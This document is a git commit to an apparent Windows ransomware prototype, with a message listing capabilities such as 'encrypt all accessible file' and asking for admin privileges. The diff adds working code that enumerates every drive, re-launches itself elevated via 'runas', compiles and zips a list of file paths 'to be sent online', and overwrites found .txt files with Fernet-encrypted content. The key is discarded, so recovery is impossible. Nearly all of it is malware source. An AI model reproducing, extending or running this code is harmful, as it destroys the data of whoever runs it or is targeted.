db11cc64bd7cae25c6405d3b9fe36e34f4fe01a6
Luxury-Karma <alexgauv@hotmail.ca>
2023-04-19 15:36:19 -0400

    alpha 1.0
    Version is able to get all file of a computer
    
    Version able to encrypt all accessible file
    
    Version do not break on inaccessible file
    
    Version can select particular file or type to encrypt
    
    Version can save and compress the information
    
    Version ask admin priviledge to get more access
    
    Version can call poweshell command
    
    Version can not :
    have a menue
    send data
    decrypt the files
    use temp file (it delate them)

--- main.py
+++ main.py
@@ -1,57 +1,71 @@
-import base64
 import ctypes
-import hashlib
 import os
 import zipfile
-import random
 import re
 import string
 import subprocess
 import sys
-import time
 from cryptography.fernet import Fernet
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-def encrypt_file(file_path: str, F_key: Fernet) -> None:
+
+def encrypt_file(file_path: str, f_key: Fernet) -> None:
     try_count = 0
+    data: bytes
+    can_open: bool = False
     # READ FILE
-    with open(file_path, 'rb') as ef:
-        data = ef.read()
-
-    # ENCRYPT
-    data = F_key.encrypt(data)
-
-    while os.path.isfile(file_path) or try_count <= 5:
-        try:
-            # DELETE
-            os.remove(file_path)
-            # REWRITE FILE
-            with open(file_path, 'wb') as ef:
-                print_r("rewrite", file_path)
-                ef.write(data)
-                break
-        finally:
-            try_count += 1
-
-def print_r():
-    pass
-"""def encrypt_file(file_path,F_key):
-    print_r(f'Encrypthing File : {file_path}')
     try:
-         with open(file_path,'rb') as ef:
-             data = ef.read()
-             print_r('can oppen the data')
-    except:
-        print_r(f'can\'t oppen the file {file_path}')"""
+        with open(file_path, 'rb') as ef:
+            data = ef.read()
+            # ENCRYPT
+            data = f_key.encrypt(data)
+            can_open = True
+    except Exception as e:
+        print(e)
+        pass
+    if can_open:
+        while os.path.isfile(file_path) and try_count <= 5:
+            try:
+                try:
+                    # DELETE
+                    os.remove(file_path)
+                except Exception as error:
+                    print(f'{error}')
+                # REWRITE FILE
+                try:
+                    with open(file_path, 'wb') as ef:
+                        print("rewrite", file_path)
+                        ef.write(data)
+                        break
+                except Exception as error:
+                    print(f'{error}')
+                    try_count = try_count + 1
 
-# files = get_all_accessible()
-"""for e in files:
-    print_r(encrypt_file(e,cipher))"""
+            finally:
+                try_count += 1
 
 
-# print_r(f"The folder returned is : {files}")
+def find_directory_from_file(name_of_file: [str], is_compress: bool, path: str, name_of_zip: str) -> [str]:
+    """
+    will find all the information inside a folder where the data have been save. if it is compres it
+    will be able to decompress it and find the file that was inside after ward.
+    :param name_of_file: The name of the file we want to get all the data from
+    :param is_compress: if the file have been compress (zip)
+    :param path: the path where we should extract the compress file (keep empty if false)
+    :param name_of_zip : The name that the zip file will have
+    :return: a string array with all the path
+    """
+    files: [str] = []
+    if is_compress:
+        with zipfile.ZipFile(name_of_zip, 'r') as zip_ref:
+            zip_ref.extractall(path)
+    for i in name_of_file:
+        try:
+            with open(i, 'r') as data:
+                for e in data:
+                    files.append(e.replace('\n', ''))
+        except PermissionError as error:
+            print(error)
+    return files
 
 
 # allow the program to call and receive powershell cmd
@@ -61,98 +75,102 @@ def powershell(cmd) -> subprocess:
 
 
 def is_admin() -> bool:
-    '''
+    """
     :return: if the program is admin
-    '''
+    """
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
+    except Exception as e:
+        print(e)
         return False
 
 
 def all_files(start_path: str) -> [str]:
-    '''
+    """
     :param start_path: path to look all of the children
     :return : all the computer files
-    '''
-    files_in_directory:[] = []
+    """
+
+    files_in_directory: [] = []
     for root, dirs, files in os.walk(start_path):
         for file in files:
             file_path = os.path.join(root, file)
             files_in_directory.append(file_path)
-            print(file_path)
     return files_in_directory
 
 
-def save_file(path:str,files:[[str]])->None:
-    '''
+def save_file(path: str, files: [[str]]) -> None:
+    """
     Save a multilayer array into a file
     :param path: Where the file should be save
     :param files: Data of the file
     :return: None
-    '''
-    with open(path,'w', encoding="utf-8") as save:
+    """
+    with open(path, 'w', encoding="utf-8") as save:
         for e in files:
             for k in e:
                 save.write(f'{k}\n')
         save.close()
 
 
-def save_specific_files(path:str,files:[str]) -> None:
-    '''
+def save_specific_files(path: str, files: [str]) -> None:
+    """
     Save a monolayer array
     :param path: Path for the new file to create
     :param files: Data that will go in that file
     :return:
-    '''
-    with open(path,'w') as save:
+    """
+    with open(path, 'w') as save:
         for e in files:
             save.write(f'{e}\n')
     save.close()
 
 
-def compress_files(path: str, name_to_the_compress_file: str) -> None:
-    '''
+def compress_files(path: [str], compress_file_name: str) -> None:
+    """
     Will zip a file into a specified path
     :param path: path where the file to compress is
-    :param name_to_the_compress_file: The name you want compressed file should have. Don't forget the extention like .txt
+    :param compress_file_name:  the name of the zip. DO NOT PUT.ZIP
     :return: None
-    '''
+    """
     # create a file with all the path of the computer
     # Compress the file with all the path to prepare it to be sent online
-    with zipfile.ZipFile('Compress.zip', 'w', compression=zipfile.ZIP_DEFLATED,compresslevel=9) as compress:
-        compress.write(path,arcname=name_to_the_compress_file)
+    with zipfile.ZipFile(f'{compress_file_name}.zip', 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=9) as \
+            compress:
+        for e in path:
+            compress.write(e, arcname=e)
     compress.close()
 
 
-def find_file_by_type(data_path: str, file_type: str)->[str]:
-    '''
+def find_file_by_type(data_path: str, file_type: str) -> [str]:
+    """
     Split files to get only the wanted one
     :param data_path: The path where the file with the data you want to look is
     :param file_type: the type of the file you want to find like .txt, .docx, .exe...
     :return: array of string with all the file absolute path
-    '''
-    regex = f'^.*(?:{file_type})' # will look at the extention and take everything before
-    reg:[str] = []
-    with open(data_path,'r') as data:
+    """
+    regex = f'^.*(?:{file_type})'   # will look at the extention and take everything before
+    reg: [str] = []
+    with open(data_path, 'r') as data:
         for e in data:
-            if re.match(regex,e):
-                reg.append(e.replace('\n',''))
+            if re.match(regex, e):
+                reg.append(e.replace('\n', ''))
     data.close()
     return reg
 
 
-def find_all_file_from_directory(data_path: str, name_of_directory) -> [str]:
-    '''
+def find_all_file_from_directory(data_path: str, name_of_directory: str) -> [str]:
+    """
     Will find all the files that have a specific directory (even partly)
-    :param data_path: path where the files is
+    :param data_path: path where the files his
+    :param name_of_directory : name of the directory
     :return:
-    '''
-    regex:str = f'(.*(?:{name_of_directory}).*)'
-    reg:[str] = []
-    with open(data_path, 'r') as data :
+    """
+    regex: str = f'(.*(?:{name_of_directory}).*)'
+    reg: [str] = []
+    with open(data_path, 'r') as data:
         for e in data:
-            if re.match(regex,e):
+            if re.match(regex, e):
                 reg.append(e)
     data.close()
     return reg
@@ -160,34 +178,42 @@ def find_all_file_from_directory(data_path: str, name_of_directory) -> [str]:
 
 def main():
     # Look if program is admin
-    files:[] = []
+    files: [] = []
     base = string.ascii_uppercase
 
-    if True:
-    #if is_admin():
-        for init_path in base:
-            print(f'starting {init_path}')
-            files.append(all_files(f'{init_path}:\\'))
-
-            ''''input(f'next ?')
-            print_r(files_all)
-            own_dir = os.getcwd()  # get is own directory to not encrypt itself
-            key = Fernet.generate_key()  # key generator
-            cipher = Fernet(key)  # hash the key
-            #for e in files:
-            #   if e is not own_dir:
-            #        encrypt_file(e, cipher)  # the file it receive'''
+    # give admin permission
+    if is_admin():
+        pass
     else:
         # Re-run the program with admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    save_file('.\\folders.txt',files)
-    compress_files('.\\folders.txt', 'test.txt')
-    files:[] = find_file_by_type('.\\folder.txt','.txt')
-    files = files + find_file_by_type('.\\folder.txt','.docx')
-    files = files + find_file_by_type('.\\folder.txt','.jpg')
-    files = files + find_file_by_type('.\\folder.txt','.png')
-    save_specific_files('.\\Searched.txt',files)
 
+    # Name of the saving files
+    compress_file_name = '.\\Compress.zip'
+    files_name = ['.\\test.txt']
+    for init_path in base:
+        print(f'starting {init_path}')
+
+        # Find all the computers files
+        files.append(all_files(f'{init_path}:\\'))
+
+        # Save Zone
+        for e in files_name:
+            save_file(e, files)
+        compress_files(files_name, compress_file_name)
+
+    # ENCRYPTION ZONE
+    key = Fernet.generate_key()  # key generator
+    cipher = Fernet(key)
+    # get all the path from files
+    with open('txt.txt', 'w') as file:
+        for e in files_name:
+            for i in find_file_by_type(e, '.txt'):
+                file.write(f'{i}\n')
+    all_path = find_directory_from_file(['.\\txt.txt'], False, '.\\', compress_file_name)
+    for e in all_path:
+        encrypt_file(e, cipher)
+    print('Encryption over')
 
     input('its over')
 
